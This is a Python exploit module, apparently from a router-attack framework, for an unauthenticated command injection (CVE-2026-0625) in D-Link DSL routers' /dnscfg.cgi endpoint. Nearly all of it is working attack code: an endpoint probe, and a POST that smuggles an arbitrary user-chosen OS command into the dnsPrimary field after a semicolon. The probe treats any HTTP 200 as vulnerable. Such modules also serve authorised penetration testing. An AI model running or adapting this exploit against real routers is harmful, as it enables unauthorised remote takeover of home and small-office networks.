# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """D-Link DSL Series DNS Configuration Command Injection (CVE-2026-0625).

    The web management interface on several D-Link DSL routers exposes a
    ``/dnscfg.cgi`` endpoint that accepts DNS server addresses via HTTP POST.
    The ``dnsPrimary`` parameter is passed unsanitized to a system() call in
    the firmware, allowing unauthenticated OS command injection.

    No authentication is required: the CGI handler does not enforce session
    validation on the DNS configuration endpoint in affected firmware versions.

    Actively exploited in the wild as of 2026.

    Affected devices: DSL-2740R, DSL-2640B, DSL-2780B, DSL-526B.

    CVSS v3.1: 9.3 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "D-Link DSL Series DNS Config Command Injection (CVE-2026-0625)",
        "description": (
            "Exploits CVE-2026-0625 via unauthenticated command injection in "
            "the /dnscfg.cgi endpoint on D-Link DSL series routers. The "
            "dnsPrimary POST parameter is passed directly to a system() call "
            "without sanitization, allowing arbitrary OS command execution. "
            "No credentials required."
        ),
        "authors": (
            "Researcher (discovery / CVE)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-0625",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-0625",
            "https://supportannouncement.us.dlink.com/security/publication.aspx",
        ),
        "devices": (
            "D-Link DSL-2740R",
            "D-Link DSL-2640B",
            "D-Link DSL-2780B",
            "D-Link DSL-526B",
        ),
    }

    target = OptIP("", "Target IPv4 address of the D-Link DSL router")
    port = OptPort(80, "Target HTTP port (default 80)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject via dnsPrimary parameter")

    _CGI_PATH = "/dnscfg.cgi"

    def _build_url(self, path: str) -> str:
        return f"http://{self.target}:{self.port}{path}"

    def _http_get(self, path: str) -> tuple[int, str]:
        """Send an HTTP GET and return (status_code, body)."""
        url = self._build_url(path)
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    def _http_post(self, path: str, data: dict) -> tuple[int, str]:
        """Send an HTTP POST with form-encoded data and return (status_code, body)."""
        url = self._build_url(path)
        encoded = urllib.parse.urlencode(data).encode("utf-8")
        req = urllib.request.Request(url, data=encoded, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                return resp.status, body
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target does not appear to expose {self._CGI_PATH} on {self.target}:{self.port}"
            )
            return

        print_success(
            f"Vulnerable endpoint confirmed at {self._CGI_PATH}, injecting command"
        )
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe the target for the dnscfg.cgi endpoint.

        A GET request to /dnscfg.cgi on vulnerable firmware returns HTTP 200
        with HTML containing DNS configuration form fields.  A 404 or
        connection failure indicates the target is not vulnerable.
        """
        try:
            status, body = self._http_get(self._CGI_PATH)
            if status == 200 and ("dns" in body.lower() or "primary" in body.lower()):
                return True
            # Some firmware versions return the form on any method
            if status == 200:
                return True
            return False
        except Exception:
            return False

    def _exploit(self) -> None:
        # Inject via semicolon: the firmware concatenates dnsPrimary into a
        # command string like: "echo <value> > /tmp/resolv.conf"
        # Injection: "8.8.8.8;COMMAND;" breaks out of the echo context.
        injected_value = f"8.8.8.8;{self.command};"

        payload = {
            "dnsPrimary": injected_value,
            "dnsSecondary": "8.8.4.4",
            "dnsRefresh": "1",
        }

        print_status(
            f"Sending POST to {self._CGI_PATH} with injected dnsPrimary: "
            f"{injected_value!r}"
        )

        status, body = self._http_post(self._CGI_PATH, payload)

        if status == 200:
            print_success(
                f"POST returned HTTP {status}. Command injection payload delivered. "
                f"The command '{self.command}' should have executed on the device."
            )
            if body.strip():
                print_info(f"Response body ({len(body)} bytes):")
                # Print first 2048 chars to avoid flooding the terminal
                for line in body[:2048].splitlines():
                    print_info(f"  {line}")
        elif status == 0:
            print_error(
                "No HTTP response received. The target may have crashed or "
                "the connection timed out."
            )
        else:
            print_error(
                f"Unexpected HTTP {status} response. The endpoint may require "
                f"authentication on this firmware version."
            )
